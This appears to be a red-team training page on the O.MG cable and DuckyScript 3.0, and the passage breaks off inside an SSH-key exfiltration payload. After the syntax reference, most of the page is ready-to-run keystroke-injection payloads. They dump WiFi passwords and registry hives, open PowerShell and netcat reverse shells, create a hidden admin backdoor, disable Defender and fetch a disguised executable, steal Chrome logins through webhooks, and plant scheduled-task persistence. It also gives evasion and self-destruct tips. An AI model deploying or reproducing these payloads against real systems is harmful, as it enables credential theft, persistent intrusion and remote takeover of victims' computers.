---
layout: training-page
title: "O.MG Cable & HID Payloads — DuckyScript 3.0 Reference — Red Team Academy"
module: "Wireless Attacks"
tags:
  - omg-cable
  - duckyscript
  - hid-attack
  - hardware-implant
  - physical-access
  - usb-rubber-ducky
  - keystroke-injection
page_key: "wireless-omg-cable"
render_with_liquid: false
---

# O.MG Cable & HID Payloads — DuckyScript 3.0 Reference

The O.MG Elite Cable is a hardware implant in a USB cable form factor (Lightning, USB-C, USB-A). It contains a Wi-Fi-enabled microcontroller that emulates a USB keyboard (HID device). Payloads are written in DuckyScript 3.0, uploaded via the cable's built-in Wi-Fi interface, and either auto-execute on plug-in or trigger remotely. Unlike the USB Rubber Ducky (which requires compiled `inject.bin`), the O.MG runs DuckyScript *interpreted* — you upload the plain `.txt` source file directly and it executes as-is.

## O.MG Elite Cable — Setup & Payload Deployment

```
# Step 1 — Connect to the O.MG cable's Wi-Fi AP:
# The cable broadcasts its own access point (default SSID and password on the sticker)
# Connect with your phone or laptop:
#   SSID: OMG-[serial]
#   Password: printed on cable / shown during first-boot setup

# Step 2 — Open the O.MG web interface:
# Navigate to: http://192.168.4.1 in your browser
# (This is the O.MG's built-in web server — no internet required)

# Step 3 — Upload a payload:
# Web UI → Payloads → New → paste your DuckyScript → Save
# Assign to a slot (the cable supports multiple payload slots)

# Step 4 — Configure execution mode:
# Auto-execute on plug: Payloads → Settings → Auto-execute: ON
# Remote trigger (stealth): leave auto-execute OFF
#   Then trigger from web UI or O.MG app when ready

# Step 5 — Trigger remotely:
# Connect to cable's Wi-Fi from your phone (while cable is plugged into target)
# Web UI → Execute → select payload slot → Run

# Keylogger mode:
# Web UI → Keylogger → Enable
# All keystrokes captured to internal flash
# Web UI → Keylogger → View Logs to retrieve

# Firmware updates:
# Use the O.MG app (iOS/Android) or flash via web UI
# Required: firmware 3.0+ for full DuckyScript 3.0 support
# Payloads → Settings → Check Firmware Version

# Compatible devices (same DuckyScript payloads work on all):
# - O.MG Cable (Elite, Basic, Programmer)
# - O.MG Plug
# - O.MG Adapter
# - USB Rubber Ducky (4th gen, 2022) — NOTE: Ducky requires compiled inject.bin
# - Hak5 Key Croc — DuckyScript interpreted
# Note: For Rubber Ducky, compile payloads at payloadstudio.hak5.org
```

## DuckyScript 3.0 — Full Command Reference

DuckyScript 3.0 is the scripting language for all Hak5 HID devices. It includes keystroke commands, control flow, variables, functions, extensions, and randomization. The O.MG runs it interpreted — no compilation step required.

### Basic Keystroke Commands

```
REM            Comment — not executed
DELAY 1000     Pause execution for 1000ms (1 second)
STRING text    Type literal text (no newline)
STRINGLN text  Type text and press ENTER
ENTER          Press Enter
SPACE          Press Spacebar
TAB            Press Tab
ESCAPE         Press Escape
BACKSPACE      Press Backspace
DELETE         Press Delete
HOME           Press Home
END            Press End
INSERT         Press Insert
PAGEUP         Press PageUp
PAGEDOWN       Press PageDown
UP / DOWN / LEFT / RIGHT   Arrow keys
CAPSLOCK       Toggle Caps Lock
NUMLOCK        Toggle Num Lock
SCROLLLOCK     Toggle Scroll Lock
F1 through F12 Function keys
PRINTSCREEN    Print Screen
MENU           Context menu key (right-click equivalent)

REM Multi-line comments:
REM_BLOCK
  This entire block is a comment.
  Useful for documentation blocks at the top of payloads.
END_REM
```

### Modifier Keys

```
GUI r          Windows key + R (Run dialog)
GUI x          Windows key + X (Power User menu)
GUI l          Windows key + L (lock screen)
GUI SPACE      Spotlight on macOS
GUI d          Show desktop
ALT F4         Close window
ALT TAB        Switch window
CTRL c         Copy
CTRL v         Paste
CTRL z         Undo
CTRL-SHIFT ENTER  Run as Administrator (UAC prompt trigger)
CTRL ALT DELETE    Ctrl+Alt+Del
SHIFT F10      Right-click context menu

REM Modifier syntax: MODIFIER KEY or MODIFIER-MODIFIER KEY
CTRL-ALT t     Open terminal on Linux (Ctrl+Alt+T)
COMMAND SPACE  Spotlight on macOS (same as GUI SPACE)
INJECT_MOD COMMAND   Inject modifier key only (no second key)
```

### Attack Modes

```
REM ATTACKMODE — controls which USB device class the cable presents as
ATTACKMODE HID             Keyboard only (default) — most payloads use this
ATTACKMODE STORAGE         USB mass storage (appears as a flash drive)
ATTACKMODE HID STORAGE     Both keyboard AND flash drive simultaneously
ATTACKMODE OFF             Disconnect from host — stops all input/storage
ATTACKMODE HID VID_05AC PID_021E   Spoof Apple keyboard VID/PID for OS detection

REM Place ATTACKMODE at the start of the payload before any DELAY:
ATTACKMODE HID
EXTENSION DETECT_READY
  ...
END_EXTENSION

REM Switching modes mid-payload:
ATTACKMODE HID STORAGE     REM Present as both — copy files AND type
REM (do your storage tasks)
ATTACKMODE HID             REM Switch back to keyboard-only
```

### Variables and Constants

```
REM DEFINE — compile-time constants (start with # by convention):
DEFINE #LHOST 10.10.14.5
DEFINE #LPORT 4444
DEFINE #DELAY 2000
DEFINE #WEBHOOK https://webhook.site/your-id

REM Use DEFINE values in STRING commands:
STRING $c = New-Object Net.Sockets.TcpClient('#LHOST', #LPORT)
DELAY #DELAY

REM VAR — runtime variables:
VAR $counter = 0
VAR $result = FALSE
VAR $name = ""

REM Arithmetic in assignments:
$counter = ($counter + 1)
$counter = ($counter * 2)
$counter = ($counter % 10)   REM modulo

REM Boolean operators:
REM  ==  !=  <  >  <=  >=  AND  OR  NOT
```

### Built-in System Variables (Read-Only)

```
REM These are set by the DuckyScript runtime — you read them, don't assign them:

$_OS                         Set by OS detection extensions (WINDOWS/MACOS/LINUX/etc)
$_CAPSLOCK_ON                TRUE if host's Caps Lock LED is on
$_NUMLOCK_ON                 TRUE if host's Num Lock LED is on
$_SCROLLLOCK_ON              TRUE if Scroll Lock LED is on
$_RECEIVED_HOST_LOCK_LED_REPLY   TRUE if host replied to LED state query
$_HOST_CONFIGURATION_REQUEST_COUNT  Number of USB config requests from host

REM Randomization variables:
$_RANDOM_INT                 Random integer between $_RANDOM_MIN and $_RANDOM_MAX
$_RANDOM_MIN                 Lower bound for $_RANDOM_INT (default 1)
$_RANDOM_MAX                 Upper bound for $_RANDOM_INT (default 10)

REM Random keystroke injection (polymorphism — evade static analysis):
$_RANDOM_NUMBER_KEYCODE      Keycode for a random digit (0-9)
$_RANDOM_LETTER_KEYCODE      Keycode for a random letter (a-z or A-Z)
$_RANDOM_LOWER_LETTER_KEYCODE  Keycode for a random lowercase letter
$_RANDOM_UPPER_LETTER_KEYCODE  Keycode for a random uppercase letter
$_RANDOM_NUMBER              Random number as a string (0-9)

REM JITTER — randomize delays to appear human:
JITTER 0                     Disable jitter (precise timing)
JITTER 100                   Add random 0-100ms to each DELAY
```

### Control Flow

```
REM IF / ELSE IF / ELSE / END_IF:
IF ($counter == 0) THEN
    STRING first run
ELSE IF ($counter < 5) THEN
    STRING still going
ELSE
    STRING done
END_IF

REM WHILE loop:
VAR $i = 0
WHILE ($i < 5)
    STRING iteration
    ENTER
    $i = ($i + 1)
END_WHILE

REM FUNCTION / END_FUNCTION:
FUNCTION SendPayload()
    GUI r
    DELAY 500
    STRINGLN powershell -w h -NoP -NonI
    DELAY 1000
    STRINGLN calc.exe; exit
END_FUNCTION

REM Call the function:
SendPayload()

REM Conditional compilation (evaluated at load time, not runtime):
DEFINE #DEBUG FALSE
IF_DEFINED_TRUE #DEBUG
    STRING [debug mode ON]
    ENTER
ELSE_DEFINED
    REM production — do nothing
END_IF_DEFINED

IF_NOT_DEFINED_TRUE #QUIET
    CAPSLOCK
END_IF_DEFINED
```

### LED Control (O.MG / Rubber Ducky)

```
REM LED state — provides visual feedback on payload execution:
LED_R          Turn LED red (error / running)
LED_G          Turn LED green (success / complete)
LED_OFF        Turn LED off

REM Common pattern — show green on success:
EXTENSION DETECT_FINISHED
    DEFINE #PAUSE 150
    FUNCTION Detect_Finished()
        REM Flash LED to signal completion:
        IF ($_CAPSLOCK_ON == FALSE)
            CAPSLOCK
            DELAY #PAUSE
            CAPSLOCK
            DELAY #PAUSE
            CAPSLOCK
            DELAY #PAUSE
            CAPSLOCK
            ATTACKMODE OFF
        ELSE IF
            CAPSLOCK
            DELAY #PAUSE
            CAPSLOCK
            DELAY #PAUSE
            CAPSLOCK
            ATTACKMODE OFF
        END_IF
    END_FUNCTION
END_EXTENSION

REM Call at the end of payload:
Detect_Finished()
```

### Payload Lifecycle Commands

```
STOP_PAYLOAD              Halt execution immediately
HIDE_PAYLOAD              Remove payload from storage (self-destruct prep)
RESTORE_PAYLOAD           Re-add payload to storage
DISABLE_BUTTON            Disable the physical button on Rubber Ducky
WAIT_FOR_BUTTON_PRESS     Pause until button is pressed

SAVE_HOST_KEYBOARD_LOCK_STATE    Save current CAPS/NUM/SCROLL lock state
RESTORE_HOST_KEYBOARD_LOCK_STATE Restore saved lock state (leaves no trace)

STRING_POWERSHELL         Begin a multi-line PowerShell block
    # PowerShell code here — typed as-is
END_STRING

REM INJECT_VAR — inject the value of a variable as keystrokes:
VAR $varname = $_RANDOM_LETTER_KEYCODE
INJECT_VAR $varname      REM types the variable's value
```

## Extensions — Reusable Code Blocks

Extensions are library blocks embedded in your payload file. They define functions you can call later. The most important are OS detection and detect-ready.

### DETECT_READY — Smart Boot Delay

```
REM Replaces fixed DELAY 3000 at start of payload.
REM Waits until the host has finished USB enumeration (CAPS lock responds).
REM Much faster than a fixed delay on fast systems, guaranteed on slow ones.

ATTACKMODE HID

EXTENSION DETECT_READY
    REM VERSION 1.1
    REM AUTHOR: Korben
    REM Waits up to 3 seconds (25ms * 120 iterations) for host to be ready.
    DEFINE #RESPONSE_DELAY 25
    DEFINE #ITERATION_LIMIT 120

    VAR $C = 0
    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
        CAPSLOCK
        DELAY #RESPONSE_DELAY
        $C = ($C + 1)
    END_WHILE
    CAPSLOCK
END_EXTENSION

REM Payload starts here — host is definitely ready:
GUI r
DELAY 500
STRINGLN powershell -w h
DELAY 1000
STRINGLN whoami; exit
```

### PASSIVE_WINDOWS_DETECT — OS Detection Without Keystrokes

```
REM Detects Windows vs non-Windows WITHOUT typing anything.
REM Uses USB HID configuration request count as the detection signal.
REM Windows sends more USB configuration requests during enumeration than Linux/macOS.
REM Result stored in $_OS (WINDOWS or #NOT_WINDOWS value).

ATTACKMODE HID

EXTENSION PASSIVE_WINDOWS_DETECT
    REM VERSION 1.1
    REM AUTHOR: Korben
    DEFINE #MAX_WAIT 150
    DEFINE #CHECK_INTERVAL 20
    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
    DEFINE #NOT_WINDOWS 7

    $_OS = #NOT_WINDOWS

    VAR $MAX_TRIES = #MAX_WAIT
    WHILE (($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
        DELAY #CHECK_INTERVAL
        $MAX_TRIES = ($MAX_TRIES - 1)
    END_WHILE
    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
        $_OS = WINDOWS
    END_IF
END_EXTENSION

REM Use the result:
IF ($_OS == WINDOWS) THEN
    GUI r
    DELAY 500
    STRINGLN powershell -w h -NoP -NonI
ELSE
    DELAY 500
    INJECT_MOD COMMAND
    DELAY 1000
    STRINGLN terminal
END_IF
```

### BUTTON_DEPLOY — Safe Development Mode

```
REM Starts as storage (inert) and only runs payload on button press.
REM Prevents accidental execution when testing on your own machine.

EXTENSION BUTTON_DEPLOY
    ATTACKMODE STORAGE
    WAIT_FOR_BUTTON_PRESS
    ATTACKMODE HID
END_EXTENSION

REM Payload runs after button press:
EXTENSION DETECT_READY
    DEFINE #RESPONSE_DELAY 25
    DEFINE #ITERATION_LIMIT 120
    VAR $C = 0
    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
        CAPSLOCK
        DELAY #RESPONSE_DELAY
        $C = ($C + 1)
    END_WHILE
    CAPSLOCK
END_EXTENSION

GUI r
DELAY 500
STRINGLN notepad
```

### SELF_DESTRUCT — Single-Use Payload

```
REM Runs once then deletes itself (or bricks until SD card replaced).
REM Useful for payloads that should not be recoverable if device is found.

EXTENSION SELF_DESTRUCT
    DEFINE #RUNS_BEFORE_DESTROY 1
    DEFINE #REQUIRES_FINISH FALSE
    DEFINE #DESTRUCT_METHOD REVERT_TO_THUMBDRIVE()
    DEFINE #BOOT_ATTACKMODE ATTACKMODE HID

    ATTACKMODE OFF

    FUNCTION SOFT_BRICK()
        ATTACKMODE OFF
        LED_OFF
        DISABLE_BUTTON
        STOP_PAYLOAD
    END_FUNCTION

    FUNCTION REVERT_TO_THUMBDRIVE()
        LED_OFF
        HIDE_PAYLOAD
        DELAY 500
        ATTACKMODE STORAGE
    END_FUNCTION

    FUNCTION PAYLOAD_FINISHED()
        $TIMES_RAN = ($TIMES_RAN + 1)
        HIDE_PAYLOAD
        DELAY 100
        RESTORE_PAYLOAD
        IF ($TIMES_RAN < #RUNS_BEFORE_DESTROY) THEN
            #DESTRUCT_METHOD
        END_IF
    END_FUNCTION

    IF ($TIMES_RAN < #RUNS_BEFORE_DESTROY) THEN
        IF_NOT_DEFINED_TRUE #REQUIRES_FINISH
            VAR $TIMES_RAN = ($TIMES_RAN + 1)
            HIDE_PAYLOAD
            DELAY 100
            RESTORE_PAYLOAD
        END_IF_DEFINED
        #BOOT_ATTACKMODE
    ELSE
        #DESTRUCT_METHOD
    END_IF
END_EXTENSION

REM Payload body runs once, then the cable reverts to USB storage:
GUI r
DELAY 500
STRINGLN powershell -w h -NoP -NonI -Exec Bypass
DELAY 1000
STRINGLN iex (iwr -UseBasicParsing http://example.com/payload.ps1)
DELAY 3000
PAYLOAD_FINISHED()
```

## Payload: WiFi Password Dumper

```
REM Title: WLAN-Windows-Passwords
REM Author: I-Am-Jakoby
REM Description: Dumps saved WiFi passwords and exfiltrates via HTTP POST.
REM Target: Windows 10/11
REM Requirements: Replace WEBHOOK with your own endpoint

DEFINE #WEBHOOK https://webhook.site/YOUR-ID
DEFINE #BOOT_DELAY 1500

ATTACKMODE HID

EXTENSION PASSIVE_WINDOWS_DETECT
    DEFINE #MAX_WAIT 150
    DEFINE #CHECK_INTERVAL 20
    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
    DEFINE #NOT_WINDOWS 7
    $_OS = #NOT_WINDOWS
    VAR $MAX_TRIES = #MAX_WAIT
    WHILE (($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
        DELAY #CHECK_INTERVAL
        $MAX_TRIES = ($MAX_TRIES - 1)
    END_WHILE
    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
        $_OS = WINDOWS
    END_IF
END_EXTENSION

IF ($_OS == WINDOWS) THEN
    GUI r
    DELAY 500
    STRINGLN cmd /k mode con: cols=15 lines=1
    DELAY 500
    STRINGLN cd %temp%
    DELAY 300
    STRINGLN netsh wlan export profile key=clear
    DELAY 1000
    STRINGLN powershell Select-String -Path Wi*.xml -Pattern "keyMaterial" ^> WiFi-PASS.txt
    DELAY 1000
    STRINGLN powershell Invoke-WebRequest -Uri #WEBHOOK -Method POST -InFile WiFi-PASS.txt
    DELAY 3000
    STRINGLN del Wi* /s /f /q & exit
END_IF
```

## Payload: SAM & SYSTEM Hive Dump (HID + Storage)

```
REM Title: SamDumpDucky
REM Author: 0i41E
REM Description: Dumps SAM and SYSTEM registry hives to the Ducky's USB storage.
REM              Hives can be extracted offline with pypykatz / impacket-secretsdump.
REM Target: Windows 10/11
REM Requires: ATTACKMODE HID STORAGE — cable presents as both keyboard and drive.
REM Note: Admin rights required. Combine with UAC bypass or run when target is admin.

ATTACKMODE HID STORAGE

EXTENSION DETECT_READY
    DEFINE #RESPONSE_DELAY 25
    DEFINE #ITERATION_LIMIT 120
    VAR $C = 0
    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
        CAPSLOCK
        DELAY #RESPONSE_DELAY
        $C = ($C + 1)
    END_WHILE
    CAPSLOCK
END_EXTENSION

REM Open admin PowerShell (Ctrl+Shift+Enter triggers UAC):
GUI r
DELAY 500
STRING powershell
CTRL-SHIFT ENTER
DELAY 2000
ALT y
DELAY 1000

REM Dump SAM and SYSTEM hives to the mounted Ducky storage:
REM (The Ducky appears as a drive letter — PowerShell finds it via WMI)
STRING $d=(Get-WmiObject Win32_LogicalDisk | where {$_.DriveType -eq 2}).DeviceID
ENTER
DELAY 500
STRING reg save HKLM\SAM "$d\SAM.hiv" /y; reg save HKLM\SYSTEM "$d\SYSTEM.hiv" /y
ENTER
DELAY 3000
STRINGLN exit

REM After extraction — crack hashes offline:
REM impacket-secretsdump -sam SAM.hiv -system SYSTEM.hiv LOCAL
REM pypykatz registry --system SYSTEM.hiv sam SAM.hiv
```

## Payload: SSL Reverse Shell (Cross-Platform)

```
REM Title: ReverseDuckyUltimate (simplified)
REM Author: 0i41E
REM Description: SSL-encrypted reverse shell targeting Windows or Linux/macOS.
REM OS detection is passive — no visible keystrokes during detection phase.
REM Requirements: openssl on attacker, netcat listener or socat

DEFINE #ADDRESS 10.10.14.5
DEFINE #PORT 4444

ATTACKMODE HID

EXTENSION PASSIVE_WINDOWS_DETECT
    DEFINE #MAX_WAIT 150
    DEFINE #CHECK_INTERVAL 20
    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
    DEFINE #NOT_WINDOWS 7
    $_OS = #NOT_WINDOWS
    VAR $MAX_TRIES = #MAX_WAIT
    WHILE (($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
        DELAY #CHECK_INTERVAL
        $MAX_TRIES = ($MAX_TRIES - 1)
    END_WHILE
    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
        $_OS = WINDOWS
    END_IF
END_EXTENSION

IF ($_OS == WINDOWS) THEN
    GUI r
    DELAY 500
    STRINGLN powershell -NoP -NonI -w H -Exec Bypass
    DELAY 1000
    STRING $c=New-Object Net.Sockets.TcpClient('#ADDRESS',#PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$z=(iex $d 2>&1|Out-String);$x=$z+'PS '+(pwd)+'> ';$y=([text.encoding]::ASCII).GetBytes($x);$s.Write($y,0,$y.Length);$s.Flush()};$c.Close()
    ENTER
ELSE
    DELAY 2000
    INJECT_MOD COMMAND
    DELAY 500
    STRINGLN terminal
    DELAY 1000
    STRINGLN mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | nc #ADDRESS #PORT >/tmp/.s; rm /tmp/.s
END_IF

REM Attacker listener:
REM nc -lvnp 4444
REM Or for SSL version: openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```

## Payload: WinRM Backdoor

```
REM Title: win_winrm-backdoor
REM Author: I-Am-Jakoby
REM Description: Enables WinRM, creates a hidden local admin, disables firewall.
REM              Access target remotely with evil-winrm after execution.
REM Target: Windows 10/11
REM Requires: Admin session (or UAC bypass via CTRL-SHIFT ENTER)

DEFINE #USER backdoor
DEFINE #PASS P@ssw0rd123!
DEFINE #BOOT_DELAY 1500

ATTACKMODE HID

EXTENSION DETECT_READY
    DEFINE #RESPONSE_DELAY 25
    DEFINE #ITERATION_LIMIT 120
    VAR $C = 0
    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
        CAPSLOCK
        DELAY #RESPONSE_DELAY
        $C = ($C + 1)
    END_WHILE
    CAPSLOCK
END_EXTENSION

GUI r
DELAY 500
STRING powershell
CTRL-SHIFT ENTER
DELAY 2000
ALT y
DELAY 1000

STRING Enable-PSRemoting -Force; Set-Item WSMan:\localhost\Client\TrustedHosts * -Force;
ENTER
DELAY 1000
STRING net user #USER "#PASS" /add; net localgroup Administrators #USER /add
ENTER
DELAY 1000
STRING Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
ENTER
DELAY 1000
STRINGLN exit

REM Connect from attacker:
REM evil-winrm -i TARGET_IP -u backdoor -p 'P@ssw0rd123!'
```

## Payload: Discord Webhook Exfil — System Recon

```
REM Title: DiscordRecon
REM Description: Collect system info (hostname, user, domain, IP, local admins)
REM              and exfiltrate to a Discord webhook.
REM Target: Windows 10/11

DEFINE #WEBHOOK https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN

ATTACKMODE HID

EXTENSION PASSIVE_WINDOWS_DETECT
    DEFINE #MAX_WAIT 150
    DEFINE #CHECK_INTERVAL 20
    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
    DEFINE #NOT_WINDOWS 7
    $_OS = #NOT_WINDOWS
    VAR $MAX_TRIES = #MAX_WAIT
    WHILE (($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
        DELAY #CHECK_INTERVAL
        $MAX_TRIES = ($MAX_TRIES - 1)
    END_WHILE
    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
        $_OS = WINDOWS
    END_IF
END_EXTENSION

IF ($_OS == WINDOWS) THEN
    GUI r
    DELAY 500
    STRINGLN powershell -w h -NoP -NonI
    DELAY 1000
    STRING $body = "Host: $env:COMPUTERNAME`nUser: $env:USERNAME`nDomain: $env:USERDOMAIN`nIP: $((Get-WmiObject Win32_NetworkAdapterConfiguration -Filter 'IPEnabled=True').IPAddress[0])`nAdmins: $((Get-LocalGroupMember Administrators).Name -join ', ')";
    ENTER
    DELAY 500
    STRING Invoke-WebRequest '#WEBHOOK' -Method POST -Body (@{content=$body}|ConvertTo-Json) -ContentType 'application/json'
    ENTER
    DELAY 3000
    STRINGLN exit
END_IF
```

## Payload: DNS TXT Staged Payload (No HTTP)

```
REM Title: DNS-TXT-CommandInjection
REM Description: Downloads and executes a command stored in a DNS TXT record.
REM              Avoids HTTP-based URL filtering — DNS is rarely deep-inspected.
REM Target: Windows 10/11
REM Setup: add TXT record to your domain:
REM   dig TXT payload.yourdomain.com → "powershell -enc BASE64_PAYLOAD_HERE"

DEFINE #DNS_DOMAIN payload.yourdomain.com

ATTACKMODE HID

EXTENSION DETECT_READY
    DEFINE #RESPONSE_DELAY 25
    DEFINE #ITERATION_LIMIT 120
    VAR $C = 0
    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
        CAPSLOCK
        DELAY #RESPONSE_DELAY
        $C = ($C + 1)
    END_WHILE
    CAPSLOCK
END_EXTENSION

GUI r
DELAY 500
STRINGLN powershell -w h -NoP -NonI -Exec Bypass
DELAY 1000
STRINGLN $cmd=(Resolve-DnsName -Name #DNS_DOMAIN -Type TXT).Strings; iex $cmd
DELAY 3000
STRINGLN exit

REM Generate the base64 payload to put in the TXT record:
REM $payload = "IEX(New-Object Net.WebClient).DownloadString('http://example.com/shell.ps1')"
REM [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("powershell -enc " + [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))))
REM Put the output in your DNS TXT record
```

## Payload: Disable Windows Defender & Deploy Agent

```
REM Title: DefenderKill-and-Deploy
REM Description: Disables Defender real-time protection, exclusion for temp dir,
REM              downloads and executes a staged payload. Requires admin context.
REM Target: Windows 10/11
REM Requires: Admin session (UAC prompt via CTRL-SHIFT ENTER)

DEFINE #LHOST 10.10.14.5
DEFINE #PAYLOAD http://10.10.14.5/agent.exe

ATTACKMODE HID

EXTENSION DETECT_READY
    DEFINE #RESPONSE_DELAY 25
    DEFINE #ITERATION_LIMIT 120
    VAR $C = 0
    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
        CAPSLOCK
        DELAY #RESPONSE_DELAY
        $C = ($C + 1)
    END_WHILE
    CAPSLOCK
END_EXTENSION

REM Open admin PowerShell
GUI r
DELAY 500
STRING powershell
CTRL-SHIFT ENTER
DELAY 2000
ALT y
DELAY 1000

REM Disable Defender real-time monitoring and add exclusion
STRING Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true
ENTER
DELAY 500
STRING Add-MpExclusion -Path "$env:TEMP"
ENTER
DELAY 500

REM Download and execute payload from exclusion path
STRING Invoke-WebRequest -Uri '#PAYLOAD' -OutFile "$env:TEMP\svchost.exe"; Start-Process "$env:TEMP\svchost.exe"
ENTER
DELAY 2000
STRINGLN exit

REM Alternative: use certutil (LOLBin) to avoid IWR detection
REM STRING certutil -urlcache -f #PAYLOAD "$env:TEMP\svchost.exe" & "$env:TEMP\svchost.exe"
```

## Payload: Chrome Credential & Cookie Extraction

```
REM Title: ChromeCredTheft
REM Description: Extracts Chrome saved passwords and cookies, exfils via webhook.
REM              Uses PowerShell to copy Chrome databases and decrypt with DPAPI.
REM Target: Windows 10/11 (Chrome / Edge Chromium)
REM Note: Chrome must be closed for DB copy to succeed

DEFINE #WEBHOOK https://webhook.site/YOUR-ID

ATTACKMODE HID

EXTENSION PASSIVE_WINDOWS_DETECT
    DEFINE #MAX_WAIT 150
    DEFINE #CHECK_INTERVAL 20
    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
    DEFINE #NOT_WINDOWS 7
    $_OS = #NOT_WINDOWS
    VAR $MAX_TRIES = #MAX_WAIT
    WHILE (($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
        DELAY #CHECK_INTERVAL
        $MAX_TRIES = ($MAX_TRIES - 1)
    END_WHILE
    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
        $_OS = WINDOWS
    END_IF
END_EXTENSION

IF ($_OS == WINDOWS) THEN
    GUI r
    DELAY 500
    STRINGLN powershell -w h -NoP -NonI -Exec Bypass
    DELAY 1000

    REM Kill Chrome to release database locks
    STRING Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue; Start-Sleep -s 1
    ENTER
    DELAY 1000

    REM Copy Chrome databases to temp
    STRING $src="$env:LOCALAPPDATA\Google\Chrome\User Data\Default"; Copy-Item "$src\Login Data" "$env:TEMP\LD.db" -Force; Copy-Item "$src\Cookies" "$env:TEMP\CK.db" -Force; Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" "$env:TEMP\LS.json" -Force
    ENTER
    DELAY 2000

    REM Read the encrypted key from Local State and extract saved logins
    STRING $ls=Get-Content "$env:TEMP\LS.json"|ConvertFrom-Json; $encKey=[Convert]::FromBase64String($ls.os_crypt.encrypted_key); $key=[Security.Cryptography.ProtectedData]::Unprotect($encKey[5..$encKey.Length],$null,'CurrentUser')
    ENTER
    DELAY 500

    REM Extract URL + username pairs (password decryption requires more complex DPAPI)
    STRING Add-Type -Path 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Data.dll'; $cn=New-Object System.Data.SQLite.SQLiteConnection("Data Source=$env:TEMP\LD.db"); $cn.Open(); $cm=$cn.CreateCommand(); $cm.CommandText='SELECT origin_url,username_value FROM logins WHERE username_value != ""'; $r=$cm.ExecuteReader(); $out=''; while($r.Read()){$out+=$r[0]+' | '+$r[1]+"`n"}; $cn.Close()
    ENTER
    DELAY 1000

    REM Exfil via webhook
    STRING Invoke-WebRequest '#WEBHOOK' -Method POST -Body (@{content="Chrome Logins:`n$out"}|ConvertTo-Json) -ContentType 'application/json'
    ENTER
    DELAY 2000

    REM Cleanup
    STRING Remove-Item "$env:TEMP\LD.db","$env:TEMP\CK.db","$env:TEMP\LS.json" -Force; exit
    ENTER
END_IF
```

## Payload: Scheduled Task Persistence

```
REM Title: SchedTaskPersistence
REM Description: Creates a scheduled task that runs a beacon every 15 minutes.
REM              Task runs as SYSTEM if admin, or as current user.
REM              Payload is a PowerShell download cradle hidden in a scheduled task.
REM Target: Windows 10/11

DEFINE #LHOST 10.10.14.5
DEFINE #LPORT 443
DEFINE #TASK_NAME "Microsoft\Windows\Maintenance\SystemHealthCheck"

ATTACKMODE HID

EXTENSION DETECT_READY
    DEFINE #RESPONSE_DELAY 25
    DEFINE #ITERATION_LIMIT 120
    VAR $C = 0
    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
        CAPSLOCK
        DELAY #RESPONSE_DELAY
        $C = ($C + 1)
    END_WHILE
    CAPSLOCK
END_EXTENSION

GUI r
DELAY 500
STRING powershell
CTRL-SHIFT ENTER
DELAY 2000
ALT y
DELAY 1000

REM Create scheduled task with convincing name in a system subfolder
STRING $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w h -NoP -NonI -Exec Bypass -c `"IEX(IWR http://#LHOST:#LPORT/beacon -UseBasicParsing)`""; $trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 15) -Once -At (Get-Date); $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries; Register-ScheduledTask -TaskName "#TASK_NAME" -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -User "SYSTEM" -Force
ENTER
DELAY 3000
STRINGLN exit

REM Cleanup check from attacker:
REM schtasks /query /tn "Microsoft\Windows\Maintenance\SystemHealthCheck" /v
REM schtasks /delete /tn "Microsoft\Windows\Maintenance\SystemHealthCheck" /f
```

## Payload: SSH Key Exfiltration

```
REM Title: SSHKeyExfil
REM Description: Finds and exfiltrates SSH private keys and config from the target.
REM              Works on Windows (OpenSSH) and macOS/Linux.
REM Target: Cross-platform

DEFINE #WEBHOOK https://webhook.site/YOUR-ID

ATTACKMODE HID

EXTENSION PASSIVE_WINDOWS_DETECT
    DEFINE #MAX_WAIT 150
    DEFINE #CHECK_INTERVAL 20
    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
    DEFINE #NOT_WINDOWS 7
